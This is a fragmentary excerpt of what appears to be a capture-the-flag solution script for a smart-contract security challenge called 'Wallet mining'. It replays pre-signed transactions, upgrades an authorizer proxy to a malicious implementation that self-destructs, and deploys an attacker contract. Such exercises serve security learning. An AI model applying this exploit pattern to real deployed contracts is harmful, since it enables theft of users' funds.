...
describe("[Challenge] Wallet mining", function () {
  ...
  it("Execution", async function () {
    ...
    rawTransactions = transactions
      .map(txToUnsignedAndSignature)
      .map((tup) => ethers.utils.serializeTransaction(...tup));
    ...
    masterCopy = await ethers.getContractAt("GnosisSafe", MASTER_COPY, player);
    ...
    badAuthorizer = await (
      await ethers.getContractFactory("BadAuthorizerUpgradeable", player)
    ).deploy();
    ...
    await authorizerImplmentation.upgradeToAndCall(
      badAuthorizer.address,
      selfDestructCallData
    );

    attacker = await (
      await ethers.getContractFactory("WalletMiningAttacker", player)
    ).deploy(walletDeployer.address);
